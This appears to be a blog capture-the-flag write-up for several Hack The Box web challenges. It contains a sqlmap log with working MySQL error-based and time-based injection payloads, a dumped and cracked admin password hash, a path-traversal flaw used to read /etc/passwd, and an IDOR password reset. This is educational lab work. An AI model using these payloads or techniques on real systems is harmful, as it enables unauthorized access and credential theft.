+[19:27:12] [INFO] testing &#39;MySQL UNION query (NULL) - 41 to 60 columns&#39;
+[19:27:15] [INFO] testing &#39;MySQL UNION query (random number) - 41 to 60 columns&#39;
+[19:27:18] [INFO] testing &#39;MySQL UNION query (NULL) - 61 to 80 columns&#39;
+[19:27:21] [INFO] testing &#39;MySQL UNION query (random number) - 61 to 80 columns&#39;
+[19:27:24] [INFO] testing &#39;MySQL UNION query (NULL) - 81 to 100 columns&#39;
+[19:27:27] [INFO] testing &#39;MySQL UNION query (random number) - 81 to 100 columns&#39;
+(custom) POST parameter &#39;JSON username&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+sqlmap identified the following injection point(s) with a total of 1397 HTTP(s) requests:
+---
+Parameter: JSON username ((custom) POST)
+    Type: error-based
+    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: {&#34;username&#34;:&#34;admin&#34; AND (SELECT 2242 FROM(SELECT COUNT(*),CONCAT(0x71716a6a71,(SELECT (ELT(2242=2242,1))),0x71626b7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IPSK&#34;,&#34;password&#34;:&#34;password&#34;}
+
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: {&#34;username&#34;:&#34;admin&#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj&#34;,&#34;password&#34;:&#34;password&#34;}
+---
+[19:27:44] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL &gt;= 5.0 (MariaDB fork)
+[19:27:44] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[19:27:44] [INFO] fetching current database
+[19:27:45] [INFO] retrieved: &#39;orbital&#39;
+[19:27:45] [INFO] fetching tables for database: &#39;orbital&#39;
+[19:27:45] [INFO] retrieved: &#39;communication&#39;
+[19:27:45] [INFO] retrieved: &#39;users&#39;
+[19:27:45] [INFO] fetching columns for table &#39;users&#39; in database &#39;orbital&#39;
+[19:27:45] [INFO] retrieved: &#39;id&#39;
+[19:27:46] [INFO] retrieved: &#39;int(11)&#39;
+[19:27:46] [INFO] retrieved: &#39;username&#39;
+[19:27:46] [INFO] retrieved: &#39;varchar(255)&#39;
+[19:27:46] [INFO] retrieved: &#39;password&#39;
+[19:27:46] [INFO] retrieved: &#39;varchar(255)&#39;
+[19:27:46] [INFO] fetching entries for table &#39;users&#39; in database &#39;orbital&#39;
+[19:27:46] [INFO] retrieved: &#39;1&#39;
+[19:27:47] [INFO] retrieved: &#39;1692b753c031f2905b89e7258dbc49bb&#39;
+[19:27:47] [INFO] retrieved: &#39;admin&#39;
+[19:27:47] [INFO] recognized possible password hashes in column &#39;password&#39;
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
+[19:28:10] [INFO] writing hashes to a temporary file &#39;/tmp/sqlmapxmrfdr0m9619/sqlmaphashes-xvcfw_me.txt&#39; 
+do you want to crack them via a dictionary-based attack? [Y/n/q] y
+[19:28:13] [INFO] using hash method &#39;md5_generic_passwd&#39;
+what dictionary do you want to use?
+[1] default dictionary file &#39;/usr/share/sqlmap/data/txt/wordlist.tx_&#39; (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+&gt; 1
+[19:28:17] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] n
+[19:28:23] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[19:28:23] [INFO] starting 2 processes 
+[19:28:33] [INFO] cracked password &#39;ichliebedich&#39; for user &#39;admin&#39;                                                                                                                                                                        
+Database: orbital                                                                                                                                                                                                                         
+Table: users
+[1 entry]
++----+-------------------------------------------------+----------+
+| id | password                                        | username |
++----+-------------------------------------------------+----------+
+| 1  | 1692b753c031f2905b89e7258dbc49bb (ichliebedich) | admin    |
++----+-------------------------------------------------+----------+
+
+[19:28:55] [INFO] table &#39;orbital.users&#39; dumped to CSV file &#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/users.csv&#39;
+[19:28:55] [INFO] fetching columns for table &#39;communication&#39; in database &#39;orbital&#39;
+[19:28:55] [INFO] retrieved: &#39;id&#39;
+[19:28:55] [INFO] retrieved: &#39;int(11)&#39;
+[19:28:55] [INFO] retrieved: &#39;source&#39;
+[19:28:56] [INFO] retrieved: &#39;varchar(255)&#39;
+[19:28:56] [INFO] retrieved: &#39;destination&#39;
+[19:28:56] [INFO] retrieved: &#39;varchar(255)&#39;
+[19:28:56] [INFO] retrieved: &#39;name&#39;
+[19:28:56] [INFO] retrieved: &#39;varchar(255)&#39;
+[19:28:56] [INFO] retrieved: &#39;downloadable&#39;
+[19:28:57] [INFO] retrieved: &#39;varchar(255)&#39;
+[19:28:57] [INFO] fetching entries for table &#39;communication&#39; in database &#39;orbital&#39;
+[19:28:57] [INFO] retrieved: &#39;Arcturus&#39;
+[19:28:57] [INFO] retrieved: &#39;communication.mp3&#39;
+[19:28:57] [INFO] retrieved: &#39;1&#39;
+[19:28:57] [INFO] retrieved: &#39;Ice World Calling Red Giant&#39;
+[19:28:57] [INFO] retrieved: &#39;Titan&#39;
+[19:28:58] [INFO] retrieved: &#39;Vega&#39;
+[19:28:58] [INFO] retrieved: &#39;communication.mp3&#39;
+[19:28:58] [INFO] retrieved: &#39;2&#39;
+[19:28:58] [INFO] retrieved: &#39;Spiral Arm Salutations&#39;
+[19:28:58] [INFO] retrieved: &#39;Andromeda&#39;
+[19:28:58] [INFO] retrieved: &#39;Trappist-1&#39;
+[19:28:58] [INFO] retrieved: &#39;communication.mp3&#39;
+[19:28:59] [INFO] retrieved: &#39;3&#39;
+[19:28:59] [INFO] retrieved: &#39;Lone Star Linkup&#39;
+[19:28:59] [INFO] retrieved: &#39;Proxima Centauri&#39;
+[19:28:59] [INFO] retrieved: &#39;Kepler-438b&#39;
+[19:28:59] [INFO] retrieved: &#39;communication.mp3&#39;
+[19:29:00] [INFO] retrieved: &#39;4&#39;
+[19:29:00] [INFO] retrieved: &#39;Small World Symposium&#39;
+[19:29:00] [INFO] retrieved: &#39;TRAPPIST-1h&#39;
+[19:29:00] [INFO] retrieved: &#39;Boop&#39;
+[19:29:00] [INFO] retrieved: &#39;communication.mp3&#39;
+[19:29:00] [INFO] retrieved: &#39;5&#39;
+[19:29:00] [INFO] retrieved: &#39;Jelly World Japes&#39;
+[19:29:01] [INFO] retrieved: &#39;Winky&#39;
+Database: orbital
+Table: communication
+[5 entries]
++----+-----------------------------+------------------+-------------+-------------------+
+| id | name                        | source           | destination | downloadable      |
++----+-----------------------------+------------------+-------------+-------------------+
+| 1  | Ice World Calling Red Giant | Titan            | Arcturus    | communication.mp3 |
+| 2  | Spiral Arm Salutations      | Andromeda        | Vega        | communication.mp3 |
+| 3  | Lone Star Linkup            | Proxima Centauri | Trappist-1  | communication.mp3 |
+| 4  | Small World Symposium       | TRAPPIST-1h      | Kepler-438b | communication.mp3 |
+| 5  | Jelly World Japes           | Winky            | Boop        | communication.mp3 |
++----+-----------------------------+------------------+-------------+-------------------+
+
+[19:29:01] [INFO] table &#39;orbital.communication&#39; dumped to CSV file &#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/communication.csv&#39;
+[19:29:01] [WARNING] HTTP error codes detected during run:
+403 (Forbidden) - 913 times, 500 (Internal Server Error) - 546 times
+[19:29:01] [INFO] fetched data logged to text files under &#39;/home/kali/.local/share/sqlmap/output/68.183.45.143&#39;
+
+[*] ending @ 19:29:01 /2023-03-20/
+</code></pre><p>Running sqlmap quickly picked up the proper payload to use for SQL injection. The payload utilized:</p>
+<pre tabindex="0"><code>Payload: {&#34;username&#34;:&#34;admin&#34; AND (SELECT 4429 FROM (SELECT(SLEEP(5)))Llei)-- Mhzj&#34;,&#34;password&#34;:&#34;password&#34;}
+</code></pre><p>And fortunately with this, sqlmap is able to grab admin&rsquo;s password from the database. The login credentials are as follows:</p>
+<pre tabindex="0"><code>{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;ichliebedich&#34;}
+</code></pre><p>Using these credentials gets us in.</p>
+<p>Now that we are in, we can see a lot of static information on this page but no flag in plain sight. At the bottom of the page, we see an export option that will prompt us to download a <code>communication.mp3</code> file. We saw some information on an export page in the source code, so let&rsquo;s revisit this to get a better idea on what&rsquo;s going on.
+In blueprints/test.py:</p>
+<pre tabindex="0"><code>def exportFile():
+    if not request.is_json:
+        return response(&#39;Invalid JSON!&#39;), 400
+    
+    data = request.get_json()
+    communicationName = data.get(&#39;name&#39;, &#39;&#39;)
+
+    try:
+        # Everyone is saying I should escape specific characters in the filename. I don&#39;t know why.
+        return send_file(f&#39;/communications/{communicationName}&#39;, as_attachment=True)
+    except:
+        return response(&#39;Unable to retrieve the communication&#39;), 400
+</code></pre><p>We see there is a lack of sanitization on how it is grabbing the file to export. If we can edit the file name we are requesting, we can perform directory traversal to grab any file that is not read-protected. To check this, we will look for the always-readable /etc/passwd.
+In burpsuite:
+Request</p>
+<p><img src="Images/20230325194705.png" alt="image"></p>
+<p>Response</p>
+<p><img src="Images/20230325194718.png" alt="image"></p>
+<p>We see the contents of /etc/passwd. Now all that remains is to find the flag.
+After making several guesses on where the flag might be located, we have yet to find the flag. Back to the source code, perhaps we can see how it is being placed upon initialization by viewing the Dockerfile:</p>
+<pre tabindex="0"><code>$ cat Dockerfile        
+FROM python:3.8-alpine
+
+# Install packages
+RUN apk add --no-cache --update mariadb mariadb-client supervisor gcc musl-dev mariadb-connector-c-dev
+
+# Upgrade pip
+RUN python -m pip install --upgrade pip
+
+# Install dependencies
+RUN pip install Flask flask_mysqldb pyjwt colorama
+
+# Setup app
+RUN mkdir -p /app
+RUN mkdir -p /communication
+
+# Switch working environment
+WORKDIR /app
+
+# Add application
+COPY challenge .
+
+# Setup supervisor
+COPY config/supervisord.conf /etc/supervisord.conf
+
+# Expose port the server is reachable on
+EXPOSE 1337
+
+# Disable pycache
+ENV PYTHONDONTWRITEBYTECODE=1
+
+# copy flag
+COPY flag.txt /signal_sleuth_firmware
+COPY files /communications/
+
+# create database and start supervisord
+COPY --chown=root entrypoint.sh /entrypoint.sh
+RUN chmod +x /entrypoint.sh
+ENTRYPOINT [&#34;/entrypoint.sh&#34;]
+</code></pre><p>They did indeed pull a cheeky one on us, note how the flag.txt has been renamed! In this machine it&rsquo;s now called <code>signal_sleuth_firmware</code>
+In Burpsuite:
+Request:</p>
+<p><img src="Images/20230325195247.png" alt="image"></p>
+<p>Response:</p>
+<p><img src="Images/20230325195302.png" alt="image"></p>
+<p>Flag <code>HTB{T1m3_b4$3d_$ql1_4r3_fun!!!}</code></p>
+<h3 id="passman">Passman</h3>
+<blockquote>
+<p>Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?
+<strong>Difficulty: easy</strong></p>
+</blockquote>
+<hr>
+<p>Visiting the page we are greeted with a login page. We are also presented with the option to create an account. After guessing a few times for user admin, I decide to create a user. Trying username <code>admin</code> results in an error, telling us this username is in use. Good to note; for now we will create user <code>a</code>.
+Registering as user a was successful, and now we see a page where we might submit and store passwords for given addresses. This page operates as a password manager, true to the challenge description and title. A brief check at XSS fails, so let&rsquo;s explore the provided source code.
+Interestingly, the <code>database.js</code> file shows us more request options than we might have expected. In particular, there is an option to update passwords:</p>
+<pre tabindex="0"><code>    async updatePassword(username, password) {
+        return new Promise(async (resolve, reject) =&gt; {
+            let stmt = `UPDATE users SET password = ? WHERE username = ?`;
+            this.connection.query(
+                stmt,
+                [
+                    String(password),
+                    String(username)
+                ],
+                (err, _) =&gt; {
+                    if(err)
+                        reject(err)
+                    resolve();
+                            }
+            )
+        });
+    }
+</code></pre><p>There is no authorization verification here, so perhaps if we can request to change the password of user admin, we can login as admin.
+Starting with a post request to register a new user:</p>
+<p><img src="Images/20230325201148.png" alt="image"></p>
+<p>Revised post request:</p>
+<p><img src="Images/20230325201127.png" alt="image"></p>
+<p>Response:</p>
+<p><img src="Images/20230325201228.png" alt="image"></p>
+<p>We have updated the admin password successfully, or so it says. When we attempt to login as admin, we are successful! The flag is given in the password field of admin&rsquo;s saved passwords.</p>
+<p><img src="Images/20230325201439.png" alt="image"></p>
+<p><code>HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}</code></p>
+<h3 id="trapped-source">Trapped Source</h3>
+<blockquote>
+<p>Intergalactic Ministry of Spies tested Pandora&rsquo;s movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?
+<strong>Difficutly: very easy</strong></p>
+</blockquote>
+<hr>
+<p>Upon visiting the given address, we see a locked keypad:
+<img src="Images/20230325101548.png" alt="image"></p>
+<p>There is not much going on with the page, so we can check the page source with CTRL+U.</p>
+<p>In the source code, we see the correct pin:</p>
+<pre tabindex="0"><code>&lt;body&gt;
+	&lt;script&gt;
+		window.CONFIG = window.CONFIG || {
+			buildNumber: &#34;v20190816&#34;,
+			debug: false,
+			modelName: &#34;Valencia&#34;,
+			correctPin: &#34;8291&#34;,
+		}
+	&lt;/script&gt;
+</code></pre><p>Just like that, the flag is given:</p>
+<p><img src="Images/20230325101735.png" alt="image"></p>
+<p>However, we cannot highlight for easy copy paste. We will inspect the object. Right clicking over the flag, we can Inspect, and the flag is in text:</p>
+<p><img src="Images/20230325101856.png" alt="image"></p>
+<p>From here we can right click and &ldquo;copy inner HTML&rdquo;. Now we have the flag to paste easy, and guaranteed free from spelling errors.</p>
+<p><code>HTB{V13w_50urc3_c4n_b3_u53ful!!!}</code></p>
+
+	    </div>
+            <div class="page-content">
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/spencerja" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://app.hackthebox.com/profile/1202496" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox">
+    <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+</a>
+<a href="https://tryhackme.com/p/spencerj" target="_blank" rel="noopener noreferrer me"
+    title="Tryhackme">
+    <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 